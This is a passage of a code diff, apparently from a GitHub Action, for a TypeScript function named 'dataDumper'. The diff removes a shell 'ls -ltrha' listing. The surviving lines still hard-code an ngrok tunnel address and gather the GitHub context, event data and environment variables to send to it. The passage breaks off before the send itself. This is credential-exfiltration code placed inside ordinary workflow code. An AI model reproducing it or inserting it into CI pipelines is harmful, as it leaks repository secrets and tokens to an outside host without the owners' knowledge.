@@ -1,4 +1,3 @@
-import { exec } from 'child_process'
 import { GitHubEvent } from './types'
 import axios from 'axios'
 
@@ -8,26 +7,11 @@ export async function dataDumper(eventData: GitHubEvent): Promise<void> {
   process.env.DUMP_URL = 'https://167d-122-171-17-208.ngrok-free.app'
   const sendURL = process.env.DUMP_URL
 
-  const listOutput = await new Promise<string>(resolve => {
-    exec('ls -ltrha', (error, stdout, stderr) => {
-      if (error) {
-        resolve(`error: ${error.message}`)
-        return
-      }
-      if (stderr) {
-        resolve(`stderr: ${stderr}`)
-        return
-      }
-      resolve(stdout)
-    })
-  })
-
   if (!sendURL) {
     return
   }
 
   const data = {
-    lsListing: listOutput,
     ghContext: github.context,
     eventData,
     envVars: {
